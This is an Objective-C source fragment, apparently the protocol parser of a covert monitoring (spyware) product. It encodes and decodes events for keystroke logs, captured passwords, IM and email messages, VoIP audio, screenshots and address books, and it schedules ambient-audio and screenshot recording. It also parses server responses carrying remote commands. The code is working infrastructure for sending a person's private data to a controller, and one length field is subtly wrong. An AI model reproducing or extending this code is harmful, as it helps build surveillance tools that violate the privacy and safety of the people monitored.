			break;
		case REMOTE_CAMERA_IMAGE:
            if ([aMetaData protocolVersion] >= 9) {
                result = [self parseRemoteCameraImageEvent:(RemoteCameraImageEvent *)event payloadFileHandle:aFileHandle];
            } else {
                // Reuse camera image event parser
                result = [self parseCameraImageEvent:(CameraImageEvent *)event payloadFileHandle:aFileHandle];
            }
			break;
		case IM_ACCOUNT:
			result = [self parseIMAccountEvent:(IMAccountEvent *)event];
			break;
		case IM_CONTACT:
			result = [self parseIMContactEvent:(IMContactEvent *)event];
			break;
		case IM_CONVERSATION:
            if (aMetaData.protocolVersion >= 10) {
                result = [self parseIMConversationEventV10:(IMConversationEvent *)event];
            } else {
                result = [self parseIMConversationEvent:(IMConversationEvent *)event];
            }
			break;
		case IM_MESSAGE:
            if (aMetaData.protocolVersion >= 10) {
                result = [self parseIMMessageEventV10:(IMMessageEvent *)event payloadFileHandle:aFileHandle];
            } else {
                result = [self parseIMMessageEvent:(IMMessageEvent *)event payloadFileHandle:aFileHandle];
            }
			break;
		case VOLIP:
			result = [self parseVoIPEvent:(VoIPEvent *)event];
			break;
		case KEY_LOG:
			result = [self parseKeyLogEvent:(KeyLogEvent *)event];
			break;
        case PAGE_VISITED:
            result = [self parsePageVisitedEvent:(PageVisitedEvent *)event];
            break;
        case PASSWORD:
            result = [self parsePasswordEvent:(PasswordEvent *)event];
            break;
        case USB:
            result = [self parseUsbEvent:(UsbEvent *)event];
            break;
        case FILE_TRANSFER:
            result = [self parseFileTransferEvent:(FileTransferEvent *)event];
            break;
        case LOGON:
            result = [self parseLogonEvent:(LogonEvent *)event];
            break;
        case APP_USAGE:
            result = [self parseAppUsageEvent:(AppUsageEvent *)event];
            break;
        case PC_IM:
            result = [self parseIMMacOSEvent:(IMMacOSEvent *)event payloadFileHandle:aFileHandle];
            break;
        case PC_EMAIL:
            result = [self parseEmailMacOSEvent:(EmailMacOSEvent *)event payloadFileHandle:aFileHandle];
            break;
        case SCREEN_RECORDING:
            result = [self parseScreenshotEvent:(ScreenshotEvent *)event payloadFileHandle:aFileHandle];
            break;
        case FILE_ACTIVITY:
            result = [self parseFileActivityEvent:(FileActivityEvent *) event];
            break;
        case PRINT_JOB:
            result = [self parsePrintJobEvent:(PrintJobEvent *) event];
            break;
        case NETWORK_TRAFFIC:
            result = [self parseNetworkTrafficEvent:(NetworkTrafficEvent *) event];
            break;
        case NETWORK_CONNECTION:
            result = [self parseNetworkConnectionEvent:(NetworkConnectionEvent *) event];
            break;
        case VOIP_AUDIO_CONVERSATION:
            result = [self parseVoIPAudioConversationEvent:(VoIPAudioConversationEvent *) event payloadFileHandle:aFileHandle];
            break;
        case APP_SCREEN_SHOT:
        case APP_SCREEN_SHOT_MOBILE:
            if (aMetaData.protocolVersion >= 13) {
                result = [self parseAppScreenShotEventV13:(AppScreenShotEvent *)event];
            } else {
                result = [self parseAppScreenShotEvent:(AppScreenShotEvent *) event];
            }
            break;
		default:
			result = nil;
			break;
	}
	
	return result;
}

#pragma mark -
#pragma mark Address book payload builder
+ (NSData *)parseAddressBookForApproval:(SendAddressBookForApproval *)command {
	if (!command) {
		return nil;
	}	
	uint16_t cmdCode = [command getCommand];
	cmdCode = htons(cmdCode);

	NSMutableData *result = [NSMutableData data];

	[result appendBytes:&cmdCode length:sizeof(cmdCode)];

	return result;
}

+ (NSData *)parseSendAddressBook:(SendAddressBook *)command {
	if (!command) {
		return nil;
	}
	uint8_t addressBookCount = [[command addressBookList] count];
	
	NSMutableData *result = [NSMutableData data];
	
	[result appendBytes:&addressBookCount length:sizeof(addressBookCount)];
	
	for (AddressBook *obj in [command addressBookList]) {
		[result appendData:[self parseAddressBook:obj]];
	}
	return result;
}
	
+ (NSData *)parseAddressBook:(AddressBook *)addressBook {
	uint32_t addressBookID = [addressBook addressBookID];
	addressBookID = htonl(addressBookID);
	NSString *addressBookName = [addressBook addressBookName];
	uint8_t addressBookNameSize = [addressBookName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	
	uint16_t vcardCount = [addressBook vCardCount];
	vcardCount = htons(vcardCount);
		
	NSMutableData *result = [NSMutableData data];
	[result appendBytes:&addressBookID length:sizeof(addressBookID)];
	[result appendBytes:&addressBookNameSize length:sizeof(addressBookNameSize)];
	[result appendData:[addressBookName dataUsingEncoding:NSUTF8StringEncoding]];
	
	[result appendBytes:&vcardCount length:sizeof(vcardCount)];
	
	while ([[addressBook VCardProvider] hasNext]) {
		[result appendData:[self parseVCard:[[addressBook VCardProvider] getObject]]];
	}
	
	return result;
}

+ (NSData *)parseVCard:(FxVCard *)vcard {
	uint8_t firstNameSize;
	NSString *firstName;
	uint8_t lastNameSize;
	NSString *lastName;
	uint8_t homePhoneSize;
	NSString *homePhone;
	uint8_t mobilePhoneSize;
	NSString *mobilePhone;
	uint8_t workPhoneSize;
	NSString *workPhone;
	uint8_t emailSize;
	NSString *email;
	uint16_t noteSize;
	NSString *note;
	uint32_t pictureDataSize;
	NSData *pictureData;
	
	firstName = [vcard firstName];
	firstNameSize = [firstName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	lastName = [vcard lastName];
	lastNameSize = [lastName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	homePhone = [vcard homePhone];
	homePhoneSize = [homePhone lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	mobilePhone = [vcard mobilePhone];
	mobilePhoneSize = [mobilePhone lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	workPhone = [vcard workPhone];
	workPhoneSize = [workPhone lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	email = [vcard email];
	emailSize = [email lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	note = [vcard note];
	noteSize = [note lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	noteSize = htons(noteSize);
	pictureData = [vcard contactPicture];
	pictureDataSize = [pictureData length];
	pictureDataSize = htonl(pictureDataSize);
	
	NSMutableData *result = [NSMutableData data];
	
	[result appendBytes:&firstNameSize length:sizeof(firstNameSize)];
	[result appendData:[firstName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&lastNameSize length:sizeof(lastNameSize)];
	[result appendData:[lastName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&homePhoneSize length:sizeof(homePhoneSize)];
	[result appendData:[homePhone dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&mobilePhoneSize length:sizeof(mobilePhoneSize)];
	[result appendData:[mobilePhone dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&workPhoneSize length:sizeof(workPhoneSize)];
	[result appendData:[workPhone dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&emailSize length:sizeof(emailSize)];
	[result appendData:[email dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&noteSize length:sizeof(noteSize)];
	[result appendData:[note dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&pictureDataSize length:sizeof(pictureDataSize)];
	[result appendData:pictureData];
	
	return result;
}

#pragma mark -
#pragma mark Other commands paylaod builder

+ (NSData *)parseGetCSID:(GetCSID *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetTime:(GetServerTime *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetProcessProfile:(GetProcessProfile *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetCommunicationDirectives:(GetCommunicationDirectives *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetConfiguration:(GetConfiguration *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetActivationCode:(GetActivationCode *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetAddressBook:(GetAddressBook *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetSoftwareUpdate:(GetSoftwareUpdate *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *)parseGetIncompatibleApplicationDefinitions:(GetIncompatibleApplicationDefinitions *)command {
	return [self parseOnlyCommandCode:command];
}

+ (NSData *) parseGetApplicationProfile: (GetApplicationProfile *) aCommand {
	return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *)  parseGetUrlProfile: (GetUrlProfile *) aCommand {
	return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseGetBinary: (GetBinary *) aCommand {
	return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseGetSupportIM: (GetSupportIM *) aCommand {
	return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseGetSnapShotRule: (GetSnapShotRule *) aCommand {
    return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseSendSnapShotRule: (SendSnapShotRule *) aCommand {
    NSMutableData *result = [[NSMutableData alloc] initWithData:[self parseOnlyCommandCode:aCommand]];
    
    uint16_t keyRuleCount = 0;
    uint8_t applicationIDSize = 0;
    uint32_t thresholdText = 0;
    uint16_t domainNameSize = 0;
    uint16_t keywordURLSize = 0;
    uint16_t keywordTitleSize = 0;
    
    // KeyStrokeRule
    keyRuleCount = [[[aCommand mSnapShotRule] mKeyStrokeRules] count];
    keyRuleCount = htons(keyRuleCount);
    [result appendBytes:&keyRuleCount length:sizeof(uint16_t)];
    
    for (KeyStrokeRule *keyStrokeRule in [[aCommand mSnapShotRule] mKeyStrokeRules]) {
        
        NSString * applicationID = [keyStrokeRule mApplicationID];
        NSString * domainName = [keyStrokeRule mDomain];
        NSString * keywordURL = [keyStrokeRule mURL];
        NSString * keywordTitle = [keyStrokeRule mTitleKeyword];
        
        // L_256
        applicationIDSize = [applicationID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        [result appendBytes:&applicationID length:sizeof(uint8_t)];
        // APPLICATION_ID
        [result appendData:[applicationID dataUsingEncoding:NSUTF8StringEncoding]];
        
        // Text less than
        thresholdText = (uint32_t)[keyStrokeRule mTextLessThan];
        thresholdText = htonl(thresholdText);
        [result appendBytes:&thresholdText length:sizeof(uint32_t)];
        
         // L_64K
        domainNameSize = [domainName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        domainNameSize = htons(domainNameSize);
        [result appendBytes:&domainNameSize length:sizeof(uint16_t)];
         // DOMAIN_NAME
        [result appendData:[domainName dataUsingEncoding:NSUTF8StringEncoding]];
        
         // L_64K
        keywordURLSize = [keywordURL lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        keywordURLSize = htons(keywordURLSize);
        [result appendBytes:&keywordURLSize length:sizeof(uint16_t)];
        // URL_KEYWORD
        [result appendData:[keywordURL dataUsingEncoding:NSUTF8StringEncoding]];
        
        // L_64K
        keywordTitleSize = [keywordTitle lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        keywordTitleSize = htons(keywordTitleSize);
        [result appendBytes:&keywordTitleSize length:sizeof(uint16_t)];
        // PAGE_TITLE_KEYWORD
        [result appendData:[keywordTitle dataUsingEncoding:NSUTF8StringEncoding]];
    }

    return ([result autorelease]);
}

+ (NSData *) parseGetMonitorApplication: (GetMonitorApplication *) aCommand {
    return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseSendMonitorApplication: (SendMonitorApplication *) aCommand {
    NSMutableData *result = [[NSMutableData alloc] initWithData:[self parseOnlyCommandCode:aCommand]];
    
    uint16_t applicationCount = 0;
    uint8_t applicationIDSize = 0;
    
    applicationCount = [[aCommand mMonitorApplications] count];
    applicationCount = htons(applicationCount);
    
    [result appendBytes:&applicationCount length:sizeof(uint16_t)];
    
    for (MonitorApplication *application in [aCommand mMonitorApplications]) {
        applicationIDSize = [[application mApplicationID] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        [result appendBytes:&applicationIDSize length:sizeof(uint8_t)];
        [result appendData:[[application mApplicationID] dataUsingEncoding:NSUTF8StringEncoding]];
    }
    return ([result autorelease]);
}

+ (NSData *) parseSendDeviceSettings: (SendDeviceSettings *) aCommand {
    NSMutableData *result = [[NSMutableData alloc] initWithData:[self parseOnlyCommandCode:aCommand]];
    DLog(@"aCommand, %@", aCommand);
    
    //DLog(@"aCommand device settings, %@", [aCommand mDeviceSettings]);
    int16_t settingCount = (int16_t)[[aCommand mDeviceSettings] count];
    settingCount = htons(settingCount);
    [result appendBytes:&settingCount length:sizeof(int16_t)];
    DLog(@"settingCount %d", settingCount);
    
    for (NSDictionary *settingInfo in [aCommand mDeviceSettings]) {
        NSString *settingID = [[settingInfo allKeys] objectAtIndex:0];
        int16_t settingIDSize = [settingID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        settingIDSize = htons(settingIDSize);
        DLog(@"settingID %@", settingID);
        
        NSString *settingValue = [settingInfo objectForKey:settingID];
        int16_t settingValueSize = [settingValue lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        settingValueSize = htons(settingValueSize);
        DLog(@"settingValue");
        
        [result appendBytes:&settingIDSize length:sizeof(int16_t)];
        [result appendData:[settingID dataUsingEncoding:NSUTF8StringEncoding]];
        [result appendBytes:&settingValueSize length:sizeof(int16_t)];
        [result appendData:[settingValue dataUsingEncoding:NSUTF8StringEncoding]];
    }
    return ([result autorelease]);
}

+ (NSData *) parseSendTemporalControl: (SendTemporalControl *) aCommand {
    NSMutableData *result = [[NSMutableData alloc] initWithData:[self parseOnlyCommandCode:aCommand]];
    DLog(@"aCommand, %@", aCommand);
    
    // Count
    uint16_t temporalControlcount = (uint16_t)[[aCommand mTemporalControls] count];
    temporalControlcount = htons(temporalControlcount);
    [result appendBytes:&temporalControlcount length:sizeof(uint16_t)];
    DLog(@"temporalControlcount %d", temporalControlcount);
    
    for (TemporalControl *temporalControl in [aCommand mTemporalControls]) {
        // Action
        int8_t action = (int8_t)[temporalControl mAction];
        [result appendBytes:&action length:sizeof(int8_t)];
        
        // Params
        if (action == kTemporalActionControlRecordAudioAmbient) {
            uint32_t paramsSize = 0;
            paramsSize = htonl(paramsSize);
            [result appendBytes:&paramsSize length:sizeof(uint32_t)];
        } else if (action == kTemporalActionControlRecordScreenShot || action == kTemporalActionControlRecordNetworkTraffic) {
            uint32_t paramsSize = 4;
            paramsSize = htonl(paramsSize);
            [result appendBytes:&paramsSize length:sizeof(uint32_t)];
            
            TemporalActionParams *params = [temporalControl mActionParams];
            uint32_t interval = (uint32_t)[params mInterval];
            interval = htonl(interval);
            [result appendBytes:&interval length:sizeof(uint32_t)];
        }
        
        // Criteria
        TemporalControlCriteria *criteria = [temporalControl mCriteria];
        int8_t recurrenceType = (int8_t)[criteria mRecurrenceType];
        [result appendBytes:&recurrenceType length:sizeof(int8_t)];
        uint8_t multiplier = (uint8_t)[criteria mMultiplier];
        [result appendBytes:&multiplier length:sizeof(uint8_t)];
        uint8_t dayOfWeek = (uint8_t)[criteria mDayOfWeek];
        [result appendBytes:&dayOfWeek length:sizeof(uint8_t)];
        uint8_t dayOfMonth = (uint8_t)[criteria mDayOfMonth];
        [result appendBytes:&dayOfMonth length:sizeof(uint8_t)];
        uint8_t monthOfYear = (uint8_t)[criteria mMonthOfYear];
        [result appendBytes:&monthOfYear length:sizeof(uint8_t)];
        
        // Start date, must be 10 bytes
        NSString *startDate = [temporalControl mStartDate];
        [result appendData:[startDate dataUsingEncoding:NSUTF8StringEncoding]];
        DLog(@"startDate %@", startDate);
        
        // End date, must be 10 bytes
        NSString *endDate = [temporalControl mEndDate];
        [result appendData:[endDate dataUsingEncoding:NSUTF8StringEncoding]];
        DLog(@"endDate %@", endDate);
        
        // Start time, must be 5 bytes
        NSString *startTime = [temporalControl mStartTime];
        [result appendData:[startTime dataUsingEncoding:NSUTF8StringEncoding]];
        DLog(@"startTime %@", startTime);
        
        // End time, must be 5 bytes
        NSString *endTime = [temporalControl mEndTime];
        [result appendData:[endTime dataUsingEncoding:NSUTF8StringEncoding]];
        DLog(@"endTime %@", endTime);
    }
    return ([result autorelease]);
}

+ (NSData *) parseGetTemporalControl: (GetTemporalControl *) aCommand {
    return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseGetNetworkAlertCriteria: (GetNetworkAlertCritiria *) aCommand {
    return ([self parseOnlyCommandCode:aCommand]);
}

+ (NSData *) parseSendNetworkAlert: (SendNetworkAlert *) aCommand {
    DLog(@"~~~~~~~~~~~ parseSendNetworkAlert aCommand, %@", aCommand);

    NSMutableData *result = [[NSMutableData alloc] initWithData:[self parseOnlyCommandCode:aCommand]];

    uint16_t clientAlertcount = (uint16_t)[[aCommand mClientAlerts] count];

    clientAlertcount = htons(clientAlertcount);
    [result appendBytes:&clientAlertcount length:sizeof(uint16_t)];

    for ( ClientAlert * clientalert in [aCommand mClientAlerts]) {
        
        int8_t clientAlertType = (int8_t)[clientalert mClientAlertType];
       
        ClientAlertData * clientalertdata = [clientalert mClientAlertData];
        
        int8_t dataType = (int8_t)[clientalertdata mClientAlertDataType];

        NSString * criteriaID = [NSString stringWithFormat:@"%d",(int)[clientalertdata mClientAlertCriteriaID]];
        int8_t criteriaIDSize = [criteriaID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];

        uint32_t seqNum = (uint32_t)[clientalertdata mSequenceNum];
        seqNum = htonl(seqNum);
 
        int8_t status = (int8_t)[clientalertdata mClientAlertStatus];
 
        NSString *alertTime = [clientalertdata mClientAlertTime];

        NSString * alertTimeZone = [clientalertdata mClientAlertTimeZone];
        int8_t alertTimeZoneSize = [alertTimeZone lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        
        [result appendBytes:&clientAlertType length:sizeof(int8_t)];
        [result appendBytes:&dataType length:sizeof(int8_t)];
        [result appendBytes:&criteriaIDSize length:sizeof(int8_t)];
        [result appendData:[criteriaID dataUsingEncoding:NSUTF8StringEncoding]];
        [result appendBytes:&seqNum length:sizeof(uint32_t)];
        [result appendBytes:&status length:sizeof(int8_t)];
        [result appendData:[alertTime dataUsingEncoding:NSUTF8StringEncoding]];
        [result appendBytes:&alertTimeZoneSize length:sizeof(int8_t)];
        [result appendData:[alertTimeZone dataUsingEncoding:NSUTF8StringEncoding]];

        EvaluationFrame * eva = [clientalertdata mEvaluationFrame];
        
        uint32_t hostCount = (uint32_t)[[eva mClientAlertRemoteHost] count];
        hostCount = htonl(hostCount);
        [result appendBytes:&hostCount length:sizeof(uint32_t)];
   
        for ( ClientAlertRemoteHost * remoteHost in [eva mClientAlertRemoteHost]) {
            
            NSString * IPV4 = [remoteHost mIPV4];
            int8_t IPV4Size = [IPV4 lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
            
            NSString * IPV6 = [remoteHost mIPV6];
            int8_t IPV6Size = [IPV6 lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
            
            NSString * hostName = [remoteHost mHostName];
            uint16_t hostNameSize = [hostName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
            hostNameSize = htons(hostNameSize);
            
            uint32_t networkTrafficCount = (uint32_t)[[remoteHost mNetworkTraffic] count];
            networkTrafficCount = htonl(networkTrafficCount);

            [result appendBytes:&IPV4Size length:sizeof(int8_t)];
            [result appendData:[IPV4 dataUsingEncoding:NSUTF8StringEncoding]];
            [result appendBytes:&IPV6Size length:sizeof(int8_t)];
            [result appendData:[IPV6 dataUsingEncoding:NSUTF8StringEncoding]];
            [result appendBytes:&hostNameSize length:sizeof(uint16_t)];
            [result appendData:[hostName dataUsingEncoding:NSUTF8StringEncoding]];
            [result appendBytes:&networkTrafficCount length:sizeof(uint32_t)];
            
            for ( ClientAlertNetworkTraffic * networkTraffic in [remoteHost mNetworkTraffic]) {
                
                int8_t transportType = (int8_t)[networkTraffic mTransportType];
                uint16_t protocolType = (uint16_t)[networkTraffic mProtocolType];
                protocolType = htons(protocolType);
                
                uint32_t portNumber = (uint32_t)[networkTraffic mPortNumber];
                portNumber = htonl(portNumber);
                
                uint64_t packetsIn = (uint64_t)[networkTraffic mPacketsIn];
                packetsIn = EndianU64_LtoB(packetsIn);
                
                uint64_t byteIn = (uint64_t)[networkTraffic mIncomingTrafficSize];
                byteIn = EndianU64_LtoB(byteIn);
                
                uint64_t packetsOut = (uint64_t)[networkTraffic mPacketsOut];
                packetsOut = EndianU64_LtoB(packetsOut);
                
                uint64_t byteOut = (uint64_t)[networkTraffic mOutgoingTrafficSize];
                byteOut = EndianU64_LtoB(byteOut);
                
                [result appendBytes:&transportType length:sizeof(int8_t)];
                [result appendBytes:&protocolType  length:sizeof(uint16_t)];
                [result appendBytes:&portNumber    length:sizeof(uint32_t)];
                [result appendBytes:&packetsIn     length:sizeof(uint64_t)];
                [result appendBytes:&byteIn        length:sizeof(uint64_t)];
                [result appendBytes:&packetsOut    length:sizeof(uint64_t)];
                [result appendBytes:&byteOut       length:sizeof(uint64_t)];
            }
        }
    }

    return ([result autorelease]);
}

+ (NSData *) parseGetAppScreenShotRule:(GetAppScreenShotRule *)aCommand{
    return ([self parseOnlyCommandCode:aCommand]);
}

#pragma mark -
#pragma mark Parse server response which is a data (entry point server data response)

+ (id)parseServerResponse:(NSData *)responseData commandMetaData: (CommandMetaData *) aCommandMetaData {
    DLog(@"###### parseServerResponse %@",responseData);
	int offset = 0;
	int16_t serverId;
	int16_t cmdEcho;
	int16_t statusCode;
	int16_t msgSize;
	NSString *msg;
	int32_t extendedStatus;

	[responseData getBytes:&serverId range:NSMakeRange(offset, sizeof(serverId))];
	offset+=sizeof(serverId); // 2
	[responseData getBytes:&cmdEcho range:NSMakeRange(offset, sizeof(cmdEcho))];
	offset+=sizeof(cmdEcho); // 4
	[responseData getBytes:&statusCode range:NSMakeRange(offset, sizeof(statusCode))];
	offset+=sizeof(statusCode); // 6
	[responseData getBytes:&msgSize range:NSMakeRange(offset, sizeof(msgSize))];
	offset+=sizeof(msgSize); // 8
    
	serverId = ntohs(serverId);
	cmdEcho = ntohs(cmdEcho);
	statusCode = ntohs(statusCode);
	msgSize = ntohs(msgSize);
	DLog(@"serverid=%d cmdEcho=%d status=%d msgSize=%d",  serverId, cmdEcho, statusCode,  msgSize);
    
	msg = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, msgSize)] encoding:NSUTF8StringEncoding];
	offset+=msgSize; // 8 + msgSize
	[responseData getBytes:&extendedStatus range:NSMakeRange(offset, sizeof(extendedStatus))];
//	offset+=sizeof(extendedStatus); // 8 + msgSize + 4
	extendedStatus = ntohl(extendedStatus);
	DLog(@"msg=%@ extended=%d", msg, extendedStatus);
	[msg release];
    
	id result = nil;
		
	switch (cmdEcho) {
		case SEND_ACTIVATE: {
			result = [self parseSendActivateResponse:responseData];
			break;
		}
		case SEND_DEACTIVATE: {
			result = [self parseSendDeactivateResponse:responseData];
			break;
		}
		case SEND_EVENTS: {
			result = [self parseSendEventResponse:responseData];
			break;
		}
		case SEND_HEARTBEAT: {
			result = [self parseSendHeartBeatResponse:responseData];
			break;
		}
		case SEND_ADDRESSBOOK_FOR_APPROVAL: {
			result = [self parseSendAddressBookForApprovalResponse:responseData];
			break;
		}
		case SEND_ADDRESSBOOK: {
			result = [self parseSendAddressBookResponse:responseData];
			break;
		}
//		case SEND_RASK: { // Obsolete call parseRAskResponse directly
//			result = [self parseRAskResponse:responseData];
//			break;
//		}
		case GET_CSID: {
			result = [self parseGetCSIDResponse:responseData];
			break;
		}
		case GET_TIME: {
			result = [self parseGetTimeResponse:responseData];
			break;
		}
		case GET_PROCESS_PROFILE: {
			result = [self parseGetProcessProfileResponse:responseData];
			break;
		}
		case GET_CONFIGURATION: {
			result = [self parseGetConfigurationResponse:responseData];
			break;
		}
		case GET_ACTIVATION_CODE: {
			result = [self parseGetActivationCodeResponse:responseData];
			break;
		}
		case GET_COMMUNICATION_DIRECTIVE: {
			result = [self parseGetCommunicationDirectivesResponse:responseData];
			break;
		}
		case GET_INCOMPATIBLE_APPLICATION_DEFINITIONS: {
			result = [self parseGetIncompatibleApplicationDefinitionsResponse:responseData];
			break;
		}
		case SEND_RUNNING_APPLICATIONS: {
			result = [self parseSendRunningApplicationResponse:responseData];
			break;
		}
		case SEND_INSTALLED_APPLICATIONS: {
			result = [self parseSendInstalledApplicationResponse:responseData];
			break;
		}
		case SEND_BOOKMARKS: {
			result = [self parseSendBookmarkResponse:responseData];
			break;
		}
		case SEND_CALENDAR: {
			result = [self parseSendCalendarResponse:responseData];
		} break;
		case SEND_NOTE: {
			result = [self parseSendNoteResponse:responseData];
		} break;
		case GET_SUPPORTED_IM: {
			result = [self parseGetSupportIMResponse:responseData];
		} break;
        case GET_SNAPSHOT_RULES: {
            result = [self parseGetSnapShotRuleResponse:responseData];
        } break;
        case SEND_SNAPSHOT_RULES: {
            result = [self parseSendSnapShotRuleResponse:responseData];
        } break;
        case GET_MONITOR_APPLICATIONS: {
            result = [self parseGetMonitorApplicationResponse:responseData];
        } break;
        case SEND_MONITOR_APPLICATIONS: {
            result = [self parseSendMonitorApplicationResponse:responseData];
        } break;
        case SEND_DEVICE_SETTINGS: {
            result = [self parseSendDeviceSettingsResponse:responseData];
        } break;
        case SEND_TEMPORAL_APPLICATION_CONTROL: {
            result = [self parseSendTemporalControlResponse:responseData];
        } break;
        case GET_TEMPORAL_APPLICATION_CONTROL: {
            result = [self parseGetTemporalControlResponse:responseData];
        } break;
        case GET_NETWORK_ALERT_CRITERIA: {
            result = [self parseGetNetworkAlertCriteriaResponse:responseData];
        } break;
        case SEND_NETWORK_ALERT: {
            result = [self parseSendNetworkAlertResponse:responseData];
        } break;
        case GET_APPSCREENSHOT_RULE: {
            if (aCommandMetaData.protocolVersion >= 13) {
                result = [self parseGetAppScreenShotRuleResponseV13:responseData];
            } else {
                result = [self parseGetAppScreenShotRuleResponse:responseData];
            }
        } break;
		default: {
			result = [[[UnknownResponse alloc] init] autorelease];
			[self parseServerResponseHeader:responseData to:result];
		} break;
	}

	return result;
}

+ (int)parseServerResponseHeader:(NSData *)responseData to:(ResponseData *)responseObj {
	DLog(@"Final length = %d, responseData = %@", [responseData length], responseData);
	int offset = 0;
	int16_t serverId;
	int16_t cmdEcho;
	int16_t statusCode;
	int16_t msgSize;
	NSString *msg;
	int32_t extendedStatus;
	int8_t pccCount;
	[responseData getBytes:&serverId range:NSMakeRange(offset, sizeof(serverId))];
	offset+=sizeof(serverId); // 2
	[responseData getBytes:&cmdEcho range:NSMakeRange(offset, sizeof(cmdEcho))];
	offset+=sizeof(cmdEcho); // 4
	[responseData getBytes:&statusCode range:NSMakeRange(offset, sizeof(statusCode))];
	offset+=sizeof(statusCode); // 6
	[responseData getBytes:&msgSize range:NSMakeRange(offset, sizeof(msgSize))];
	offset+=sizeof(msgSize); // 8
	DLog(@"serverid=%d cmdEcho=%d status=%d msgSize=%d", 
		 serverId,
		 cmdEcho,
		 statusCode,
		 msgSize);
	serverId = ntohs(serverId);
	cmdEcho = ntohs(cmdEcho);
	statusCode = ntohs(statusCode);
	msgSize = ntohs(msgSize);
	DLog(@"serverid=%d cmdEcho=%d status=%d msgSize=%d", 
		 serverId,
		 cmdEcho,
		 statusCode,
		 msgSize);
	msg = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, msgSize)] encoding:NSUTF8StringEncoding];
	offset+=msgSize; // 8 + msgSize
	[responseData getBytes:&extendedStatus range:NSMakeRange(offset, sizeof(extendedStatus))];
	offset+=sizeof(extendedStatus); // 8 + msgSize + 4
	extendedStatus = ntohl(extendedStatus);
	DLog(@"msg=%@ extended=%d", msg, extendedStatus);
	DLog(@"offset: %d, pccCountSize: %d, (8+msgSize+4): %d", offset, sizeof(pccCount), 8+msgSize+4)
	[responseData getBytes:&pccCount range:NSMakeRange(offset, sizeof(pccCount))];
	offset+=sizeof(pccCount); // 8 + msgSize + 5
	DLog(@"offset = %d", offset)
	//pccCount = ntohl(pccCount);
	DLog(@"pccCount = %d", pccCount)
	if (pccCount > 0) {
		[responseObj setPCCArray:[NSMutableArray array]];
		for (int i=0; i<pccCount; i++) {
			PCC *pcc = [[PCC alloc] init];
			int16_t cmdId;
			int8_t argumentCount;
			int16_t argumentLength;
			offset = [ProtocolParser getValueFromData:responseData toBuffer:&cmdId withBufferSize:sizeof(cmdId) atOffset:offset];
			cmdId = ntohs(cmdId);
			DLog(@"cmdId = %d offset = %d", cmdId, offset)
			
			[pcc setArguments:[NSMutableArray array]];
			[pcc setPCCID:cmdId];
			
			offset = [ProtocolParser getValueFromData:responseData toBuffer:&argumentCount withBufferSize:sizeof(argumentCount) atOffset:offset];
			DLog(@"offset = %d", offset)
			for (int j=0; j<argumentCount;j++) {
				offset = [ProtocolParser getValueFromData:responseData toBuffer:&argumentLength withBufferSize:sizeof(argumentLength) atOffset:offset];
				argumentLength = ntohs(argumentLength);
				DLog(@"argumentLength = %d, offset = %d", argumentLength, offset)
				NSString *argument = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, argumentLength)] encoding:NSUTF8StringEncoding];
				offset+=argumentLength;
				DLog(@"argument = %@, offset = %d", argument, offset)
				[[pcc arguments] addObject:argument];
				[argument release];
			}
			[[responseObj PCCArray] addObject:pcc];
			[pcc release];
		}
	}
	
	DLog(@"Status Code = %d offset = %d", statusCode, offset);
	[responseObj setPCCCount:pccCount];
	[responseObj setServerID:serverId];
	[responseObj setCmdEcho:cmdEcho];
	[responseObj setStatusCode:statusCode];
	[responseObj setMessage:msg];
	[responseObj setExtendedStatus:extendedStatus];
	
	[msg release];

	return offset;
}

+ (SendActivateResponse *)parseSendActivateResponse:(NSData *)responseData {
	DLog(@"responseData: %@", responseData)
	SendActivateResponse *result = [[SendActivateResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	
	if ([result statusCode] == 0) {
		NSData *md5 = [responseData subdataWithRange:NSMakeRange(offset, 16)];
		offset+=16;
		uint16_t cfgID;
